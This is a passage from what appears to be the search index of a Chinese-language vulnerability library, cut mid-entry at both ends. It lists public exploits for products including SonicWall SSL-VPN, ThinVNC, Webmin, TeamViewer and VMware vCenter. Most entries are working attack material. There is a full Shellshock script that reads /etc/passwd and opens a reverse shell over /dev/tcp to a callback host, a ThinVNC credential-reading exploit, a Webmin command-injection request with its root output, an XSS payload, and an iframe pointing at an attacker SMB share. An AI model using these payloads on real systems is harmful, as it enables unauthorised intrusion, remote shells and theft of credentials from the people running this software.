this.","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SonicWall%20SSL-VPN/SonicWall%20SSL-VPN%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E/#details-httpsdarrenmartynie20210124visualdoor-sonicwall-ssl-vpn-exploit","title":"Details: https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/","text":"<p>import requests import sys import telnetlib import socket from threading import Thread from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) import time</p> <p>def banner():     print \"\"\"</p> <pre><code>         88                                      88  \n         \"\"                                      88  \n                                                 88\n</code></pre> <p>8b       d8  88  ,adPPYba,  88       88  ,adPPYYba,  88 <code>8b     d8'  88  I8[    \"\"  88       88  \"\"</code>Y8  88 <code>8b   d8'   88</code>\"Y8ba,   88       88  ,adPPPPP88  88 <code>8b,d8'    88  aa    ]8I  \"8a,   ,a88  88,    ,88  88       \"8\"      88</code>\"YbbdP\"'   <code>\"YbbdP'Y8</code>\"8bbdP\"Y8  88  </p> <pre><code>         88                                          \n         88                                          \n         88                                          \n ,adPPYb,88   ,adPPYba,    ,adPPYba,   8b,dPPYba,    \na8\"    `Y88  a8\"     \"8a  a8\"     \"8a  88P'   \"Y8    \n8b       88  8b       d8  8b       d8  88            \n\"8a,   ,d88  \"8a,   ,a8\"  \"8a,   ,a8\"  88            \n `\"8bbdP\"Y8   `\"YbbdP\"'    `\"YbbdP\"'   88   \nSonicWall SSL-VPN Appliance Remote Exploit\n</code></pre> <p>Public Release (Jan 2021). Author: Darren Martyn. Credit goes to Phineas Fisher for this. Stay inside, do crimes.     \"\"\" </p> <p>def handler(lp): # handler borrowed from Stephen Seeley.     print \"(+) starting handler on port %d\" %(lp)     t = telnetlib.Telnet()     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     s.bind((\"0.0.0.0\", lp))     s.listen(1)     conn, addr = s.accept()     print \"(+) connection from %s\" %(addr[0])     t.sock = conn     print \"(+) pop thy shell!\"     t.interact()</p> <p>def execute_command(target, command):     url = target + \"/cgi-bin/jarrewrite.sh\"     headers = {\"User-Agent\": \"() { :; }; echo ; /bin/bash -c '%s'\" %(command)}     r = requests.get(url=url, headers=headers, verify=False)     return r.text</p> <p>def check_exploitable(target):     print \"(+) Testing %s for pwnability...\" %(target)     output = execute_command(target=target, command=\"cat /etc/passwd\")     if \"root:\" in output:         print \"(*) We can continue, time to wreck this shit.\"         return True     else:         return False</p> <p>def pop_reverse_shell(target, cb_host, cb_port):     print \"(+) Sending callback to %s:%s\" %(cb_host, cb_port)     backconnect = \"nohup bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1 &amp;\" %(cb_host, cb_port)     execute_command(target=target, command=backconnect)</p> <p>def hack_the_planet(target, cb_host, cb_port):     if check_exploitable(target) == True:         pass     else:         sys.exit(\"(-) Target not exploitable...\")     handlerthr = Thread(target=handler, args=(int(cb_port),))     handlerthr.start()     pop_reverse_shell(target=target, cb_host=cb_host, cb_port=cb_port)</p> <p>def main(args):     banner()     if len(args) != 4:         sys.exit(\"use: %s https://some-vpn.lol:8090 hacke.rs 1337\" %(args[0]))     hack_the_planet(target=args[1], cb_host=args[2], cb_port=args[3])</p> <p>if name == \"main\":     main(args=sys.argv)</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SpamTitan/SpamTitan%207.07%E5%A4%9A%E4%B8%AARCE%E6%BC%8F%E6%B4%9E/","title":"SpamTitan 7.07\u591a\u4e2aRCE\u6f0f\u6d1e","text":"<p>\u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1nCUADEBXrn-8vsuOjxFd1Q \u63d0\u53d6\u7801\uff1abyze</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Sprig%20Cloud/Spring%20Cloud%20Netflix%20Hystrix%20Dashboard%20SSRF%E6%BC%8F%E6%B4%9E/","title":"Spring Cloud Netflix Hystrix Dashboard SSRF","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Sprig%20Cloud/Spring%20Cloud%20Netflix%20Hystrix%20Dashboard%20SSRF%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u4fe1\u606f:","text":"<p>Spring Cloud Netflix\uff0c2.2.4\u4e4b\u524d\u76842.2.x\u7248\u672c\uff0c2.1.6\u4e4b\u524d\u76842.1.x\u7248\u672c\u4ee5\u53ca\u8f83\u65e7\u7684\u4e0d\u53d7\u652f\u6301\u7684\u7248\u672c\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528Hystrix Dashboard proxy.stream\u7aef\u70b9\u5411\u670d\u52a1\u5668\u6258\u7ba1\u53ef\u8bbf\u95ee\u7684\u4efb\u4f55\u670d\u52a1\u5668\u53d1\u51fa\u8bf7\u6c42\u4eea\u8868\u677f\u3002\u6076\u610f\u7528\u6237\u6216\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u8bf7\u6c42\u53d1\u9001\u5230\u4e0d\u5e94\u516c\u5f00\u516c\u5f00\u7684\u5176\u4ed6\u670d\u52a1\u5668\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Sprig%20Cloud/Spring%20Cloud%20Netflix%20Hystrix%20Dashboard%20SSRF%E6%BC%8F%E6%B4%9E/#_2","title":"\u5f71\u54cd\u8303\u56f4:","text":"<p>Spring Cloud Netflix 2.2.0\u81f32.2.3 2.1.0\u81f32.1.5 \u8f83\u65e7\u7684\u4e0d\u53d7\u652f\u6301\u7684\u7248\u672c\u4e5f\u4f1a\u53d7\u5230\u5f71\u54cd</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Sprig%20Cloud/Spring%20Cloud%20Netflix%20Hystrix%20Dashboard%20SSRF%E6%BC%8F%E6%B4%9E/#_3","title":"\u6f0f\u6d1e\u590d\u73b0:","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Sprig%20Cloud/Spring%20Cloud%20Netflix%20Hystrix%20Dashboard%20SSRF%E6%BC%8F%E6%B4%9E/#poc","title":"poc\uff1a","text":"<pre><code>/proxy.stream?origin=http://www.baidu.com \n\u200b```\n\n#### \u4fee\u590d\u65b9\u6848:\n\n\u5b98\u65b9\u5df2\u7ecf\u8fdb\u884c\u5b89\u5168\u5347\u7ea7\uff0c\u53d7\u5f71\u54cd\u7528\u6237\u8bf7\u5c3d\u5feb\u5347\u7ea7\u5230\u4fee\u590d\u7248\u672c: Spring Cloud Netflix\uff1a 2.2.4 2.1.6 \u8f83\u65e7\u7684\u7248\u672c\u5e94\u5347\u7ea7\u5230\u53d7\u652f\u6301\u7684\u5206\u652f\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Spring%20Statemachine/yii2-statemachine%20v2.x.x%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/","title":"yii2 statemachine v2.x.x\u5b58\u5728XSS\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Spring%20Statemachine/yii2-statemachine%20v2.x.x%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 yii2-statemachine v2.x.x\u5b58\u5728XSS\u6f0f\u6d1e 2018-06-12 longer https://github.com/ptheofan/yii2-statemachine-demo https://github.com/ptheofan/yii2-statemachine-demo v2.x.x CVE-2018-12290"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Spring%20Statemachine/yii2-statemachine%20v2.x.x%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>\u7531\u4e8erole\u53c2\u6570\u8fc7\u6ee4\u4e0d\u4e25\u683c\uff0c\u5bfc\u81f4\u53ef\u4ee5\u63d2\u5165js\u4ee3\u7801\u9020\u6210\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u3002\u5982\u5c06role\u53c2\u6570\u8d4b\u503c\u4e3a<code>guest'%22()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;prompt(123555)&lt;/ScRiPt&gt;</code>\uff0c\u5e76\u8fdb\u884cget\u65b9\u5f0f\u63d0\u4ea4\uff0c\u53ef\u9020\u6210\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u3002   </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Spring%20Statemachine/yii2-statemachine%20v2.x.x%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>exp\u4ee3\u7801\u5982\u4e0b\uff1a  </p> <pre><code>https://127.0.0.1/?role=guest'%22()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;prompt(123555)&lt;/ScRiPt&gt;\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Spring%20Statemachine/yii2-statemachine%20v2.x.x%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/#poc_1","title":"POC\u622a\u56fe\u6548\u679c\u5982\u4e0b\uff1a","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/TeamViewer/TeamViewer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-13699%29/","title":"TeamViewer \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2020-13699)","text":"<p>\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-23 15:53:05</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/TeamViewer/TeamViewer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-13699%29/#_1","title":"\u5f71\u54cd\u7248\u672c","text":"<p>TeamViewer &lt; 8.0.258861 TeamViewer &lt; 9.0.28860 TeamViewer &lt; 10.0.258873 TeamViewer &lt; 11.0.258870 TeamViewer &lt; 12.0.258869 TeamViewer &lt; 13.2.36220 TeamViewer &lt; 14.2.56676 TeamViewer &lt; 15.8.3</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/TeamViewer/TeamViewer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-13699%29/#_2","title":"\u6f0f\u6d1e\u63cf\u8ff0","text":"<p>TeamViewer\u5b58\u5728\u672a\u5f15\u7528\u7684\u641c\u7d22\u8def\u5f84\u6216\u5143\u7d20\u7684\u5b89\u5168\u7f3a\u9677\uff0c\u7531\u4e8e\u5e94\u7528\u7a0b\u5e8f\u6ca1\u6709\u6b63\u786e\u5f15\u7528\u5b83\u7684\u81ea\u5b9a\u4e49URI\u5904\u7406\u7a0b\u5e8f\uff0c\u5f53\u5b89\u88c5\u6709TeamViewer\u7684\u6613\u53d7\u653b\u51fb\u7248\u672c\u7684\u7cfb\u7edf\u8bbf\u95ee\u6076\u610f\u521b\u5efa\u7684\u7f51\u7ad9\u65f6\uff0c\u53ef\u80fd\u4f1a\u88ab\u5229\u7528\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u7cbe\u5fc3\u5236\u4f5c\u7684URL</p> <pre><code>\uff08iframe src='teamviewer10: --play \\\\attacker-IP\\share\\fake.tvs'\uff09\n</code></pre> <p>  \u5c06\u6076\u610fiframe\u5d4c\u5165\u7f51\u7ad9\u4e2d\uff0c\u4ece\u800c\u542f\u52a8TeamViewer Windows\u684c\u9762\u5ba2\u6237\u7aef\u5e76\u5f3a\u5236\u5176\u6253\u5f00\u8fdc\u7a0bSMB\u5171\u4eab\u3002 Windows\u5c06\u5728\u6253\u5f00SMB\u5171\u4eab\u65f6\uff0c\u6267\u884cNTLM\u8eab\u4efd\u9a8c\u8bc1\uff0c\u5e76\u4e14\u53ef\u4ee5\u8f6c\u53d1\u8be5\u8bf7\u6c42\uff08\u4f7f\u7528\u5982\u54cd\u5e94\u7a0b\u5e8f\u4e4b\u7c7b\u7684\u5de5\u5177\uff09\u4ee5\u6267\u884c\u4ee3\u7801\uff08\u6216\u6355\u83b7\u8be5\u8bf7\u6c42\u4ee5\u8fdb\u884c\u54c8\u5e0c\u7834\u89e3\uff09</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/TeamViewer/TeamViewer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-13699%29/#_3","title":"\u4fee\u590d\u5efa\u8bae","text":"<p>\u9488\u5bf9\u6b64\u6f0f\u6d1e\u5b98\u65b9\u5df2\u57288.0.258861\u30019.0.258860\u300110.0.258873\u300111.0.258870\u300112.0.258869\u300113.2.36220\u300114.2.56676\u300114.7.48350\u548c15.8.3\u7248\u672c\u4e2d\u4fee\u590d\u3002 \u8bf7\u53d7\u5f71\u54cd\u7684\u7528\u6237\u53c2\u8003\u4ee5\u4e0b\u94fe\u63a5\u5b89\u88c5\u8865\u4e01\u66f4\u65b0\uff1ahttps://www.teamviewer.com/en/download/previous-versions/</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/ThinVnc/CVE-2019-17662-ThinVNC%201.0b1%20-%20Authentication%20Bypass/","title":"CVE 2019 17662 ThinVNC 1.0b1   Authentication Bypass","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/ThinVnc/CVE-2019-17662-ThinVNC%201.0b1%20-%20Authentication%20Bypass/#thinvnc-10b1-authentication-bypass","title":"ThinVNC 1.0b1 - Authentication Bypass","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/ThinVnc/CVE-2019-17662-ThinVNC%201.0b1%20-%20Authentication%20Bypass/#_1","title":"\u7b80\u4ecb","text":"<p>ThinVNC\u662f\u4e00\u6b3e\u57fa\u4e8eHTML5\u548cAJAX\u7684\u8fdc\u7a0b\u684c\u9762\u5b9e\u73b0  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/ThinVnc/CVE-2019-17662-ThinVNC%201.0b1%20-%20Authentication%20Bypass/#poc","title":"POC","text":"<pre><code># Exploit Title: ThinVNC 1.0b1 - Authentication Bypass\n# Date: 2019-10-17\n# Exploit Author: Nikhith Tumamlapalli\n# Contributor WarMarX\n# Vendor Homepage: https://sourceforge.net/projects/thinvnc/\n# Software Link: https://sourceforge.net/projects/thinvnc/files/ThinVNC_1.0b1/ThinVNC_1.0b1.zip/download\n# Version: 1.0b1\n# Tested on: Windows All Platforms\n# CVE : CVE-2019-17662\n\n# Description:\n# Authentication Bypass via Arbitrary File Read\n\n#!/usr/bin/python3\n\nimport sys\nimport os\nimport requests\n\ndef exploit(host,port):\n    url = \"http://\" + host +\":\"+port+\"/xyz/../../ThinVnc.ini\"\n    r = requests.get(url)\n    body = r.text\n    print(body.splitlines()[2])\n    print(body.splitlines()[3])\n\n\n\ndef main():\n    if(len(sys.argv)!=3):\n        print(\"Usage:\\n{} &lt;host&gt; &lt;port&gt;\\n\".format(sys.argv[0]))\n        print(\"Example:\\n{} 192.168.0.10 5888\")\n    else:\n        port = sys.argv[2]\n        host = sys.argv[1]\n        exploit(host,port)\n\nif __name__ == '__main__':\n    main()\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/VMware/VMware%20vCenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","title":"VMware vCenter\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6","text":"<p>\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-10-14 11:26:15</p> <p> Poc:</p> <pre><code>http://x.x.x.x/eam/vib?id=c:\\programData\\Vmware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properti\n</code></pre> <p>\u539f\u6587\u94fe\u63a5\uff1a https://twitter.com/ptswarm/status/1316016337550938122</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Webmin/CVE-2019-15107/CVE-2019-15107%20Webmin%201.920%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"CVE-2019-15107  Webmin RCE &lt;=1.920","text":"<p><pre><code>1.  Webmin &lt;=1.920\n2.  \u6f0f\u6d1e\u9700\u8981\u5f00\u542f\u5bc6\u7801\u91cd\u7f6e\u529f\u80fd\u3002\n</code></pre> <code>https://10.10.20.166:10000/password_change.cgi</code></p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Webmin/CVE-2019-15107/CVE-2019-15107%20Webmin%201.920%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","title":"poc","text":"<p>\u5728\u53c2\u6570<code>old</code>\u540e\u52a0\u4e0a<code>|ifconfig</code> \u6267\u884c\u547d\u4ee4\u3002\uff08user\u4e0d\u5b58\u5728\u4ecd\u7136\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\uff09</p> <pre><code>POST /password_change.cgi HTTP/1.1\nHost: 10.10.20.166:10000\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nCookie: redirect=1; testing=1; sid=x; sessiontest=1\nReferer: https://10.10.20.166:10000/session_login.cgi\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 60\n\nuser=rootxx&amp;pam=&amp;expired=2&amp;old=test|id&amp;new1=test2&amp;new2=test2\n\n\n\n&lt;div class=\"panel-body\"&gt;\n&lt;hr&gt;\n&lt;center&gt;&lt;h3&gt;Failed to change password : The current password is incorrectuid=0(root) gid=0(root) groups=0(root)\n&lt;/h3&gt;&lt;/center&gt;\n</code></pre> <p>\u6279\u91cf\u811a\u672cgithub\u83b7\u53d6</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Webmin/CVE-2019-15107/CVE-2019-15107%20Webmin%201.920%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","title":"\u53c2\u8003\u94fe\u63a5\uff1a","text":"<p>https://github.com/vulhub/vulhub/tree/master/webmin/CVE-2019-15107</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/X.org%20X%20server/CVE-2019-17624-X.Org%20X%20Server%201.20.4%20-%20Local%20Stack%20Overflow-Linux%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2X%20Server%E6%9C%AC%E5%9C%B0%E6%A0%88%E6%BA%A2%E5%87%BAPOC/","title":"CVE 2019 17624 X.Org X Server 1.20.4   Local Stack Overflow Linux\u56fe\u5f62\u754c\u9762X Server\u672c\u5730\u6808\u6ea2\u51faPOC","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/X.org%20X%20server/CVE-2019-17624-X.Org%20X%20Server%201.20.4%20-%20Local%20Stack%20Overflow-Linux%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2X%20Server%E6%9C%AC%E5%9C%B0%E6%A0%88%E6%BA%A2%E5%87%BAPOC/#cve-2019-17624-xorg-x-server-1204-local-stack-overflow-linuxx-serverpoc","title":"CVE-2019-17624-X.Org X Server 1.20.4 - Local Stack Overflow-Linux\u56fe\u5f62\u754c\u9762X Server\u672c\u5730\u6808\u6ea2\u51faPOC","text":"<p>0x1 \u7b80\u5355\u4ecb\u7ecd </p> <p>X Server \u662f\u7edd\u5927\u5bf9\u6570Linux\u53d1\u884c\u7248\u548cUnix\u7cfb\u7edf\u7684\u57fa\u7840\u56fe\u5f62\u754c\u9762\u7a0b\u5e8f\uff0c\u662f\u7cfb\u7edf\u6807\u914d\u3002\u800c\u6b64\u7a0b\u5e8f\u4e5f\u662f\u4ee5Root\u6743\u9650\u542f\u52a8\u7684\uff0c\u56e0\u800c\u6210\u529f\u6ea2\u51fa\u5b83\u800c\u83b7\u5f97\u7684shell\uff0c\u4e5f\u662froot\u6743\u9650\u3002  </p> <p>0x2 \u6f0f\u6d1e\u76f8\u5173\u4fe1\u606f </p> <pre><code># \u65f6\u95f4: 2019-10-16\n\n# \u4f5c\u8005: Marcelo V\u00e1zquez (s4vitar)\n\n# \u5382\u5546: https://www.x.org/\n\n# \u7248\u672c: &lt;= 1.20.4\n\n# \u6d4b\u8bd5\u5e73\u53f0: Linux\n\n# CVE: CVE-2019-17624\n</code></pre> <p>0x3 POC </p> <pre><code>#!/usr/bin/python\n#coding: utf-8\n\n# ************************************************************************\n# *                Author: Marcelo V\u00e1zquez (aka s4vitar)                 *\n# *      X.Org X Server 1.20.4 / X Protocol Version 11 (Stack Overflow)  *\n# ************************************************************************\n\nimport sys, time\nimport ctypes as ct\n\nfrom ctypes import cast\nfrom ctypes.util import find_library\n\ndef access_violation(x11, current_display):\n  keyboard = (ct.c_char * 1000)()\n  x11.XQueryKeymap(current_display, keyboard)\n\nif __name__ == '__main__':\n\n  print \"\\n[*] Loading x11...\\n\"\n  time.sleep(2)\n\n  x11 = ct.cdll.LoadLibrary(find_library(\"X11\"))\n  current_display = x11.XOpenDisplay(None)\n\n  print \"[*] Exploiting...\\n\"\n  time.sleep(1)\n\n  try:\n    access_violation(x11, current_display)\n\n  except:\n    print \"\\nError...\\n\"\n    sys.exit(1)\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/ezEIP/%E4%B8%87%E6%88%B7%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8ezEIP%E5%89%8D%E5%8F%B0%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"\u4e07\u6237\u7f51\u7edc\u6280\u672f\u6709\u9650\u516c\u53f8ezEIP\u524d\u53f0\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/ezEIP/%E4%B8%87%E6%88%B7%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8ezEIP%E5%89%8D%E5%8F%B0%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb\uff1a","text":"<p>ezEIP\u662f\u4e07\u6237\u7f51\u7edc\u6280\u672f\u6709\u9650\u516c\u53f8\u4e00\u6b3e\u7f51\u7ad9\u7ba1\u7406\u7cfb\u7edf\u3002\u4e07\u6237\u7f51\u7edc\u6280\u672f\u6709\u9650\u516c\u53f8ezEIP\u524d\u53f0\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u83b7\u53d6\u670d\u52a1\u5668\u7ba1\u7406\u5458\u6743\u9650</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/ezEIP/%E4%B8%87%E6%88%B7%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8ezEIP%E5%89%8D%E5%8F%B0%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u4fe1\u606f","text":"<p>\u6f0f\u6d1eID:130125</p> <p>\u6f0f\u6d1e\u7b49\u7ea7: \u9ad8\u5371</p> <p>\u53d1\u5e03\u65f6\u95f4:2020-02-08</p> <p>CNVD\u7f16\u53f7:CNVD-2020-04888</p> <p>\u6f0f\u6d1e\u7c7b\u578b:\u901a\u7528\u578b\u6f0f\u6d1e</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/ezEIP/%E4%B8%87%E6%88%B7%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8ezEIP%E5%89%8D%E5%8F%B0%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_3","title":"\u6f0f\u6d1e\u516c\u544a","text":"<p>\u5382\u5546\u5c1a\u672a\u63d0\u4f9b\u6f0f\u6d1e\u4fee\u590d\u65b9\u6848\uff0c\u8bf7\u5173\u6ce8\u5382\u5546\u4e3b\u9875\u66f4\u65b0\uff1ahttp://www.wanhu.cn</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/mini_httpd/mini_httpd%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-18778%EF%BC%89/","title":"mini_httpd\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff08CVE-2018-18778\uff09","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/mini_httpd/mini_httpd%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-18778%EF%BC%89/#_1","title":"\u524d\u8a00","text":"<p>Mini_httpd\u662f\u4e00\u4e2a\u5fae\u578b\u7684Http\u670d\u52a1\u5668\uff0c\u5728\u5360\u7528\u7cfb\u7edf\u8d44\u6e90\u8f83\u5c0f\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u4fdd\u6301\u4e00\u5b9a\u7a0b\u5ea6\u7684\u6027\u80fd\uff08\u7ea6\u4e3aApache\u768490%\uff09\uff0c\u56e0\u6b64\u5e7f\u6cdb\u88ab\u5404\u7c7bIOT\uff08\u8def\u7531\u5668\uff0c\u4ea4\u6362\u5668\uff0c\u6444\u50cf\u5934\u7b49\uff09\u4f5c\u4e3a\u5d4c\u5165\u5f0f\u67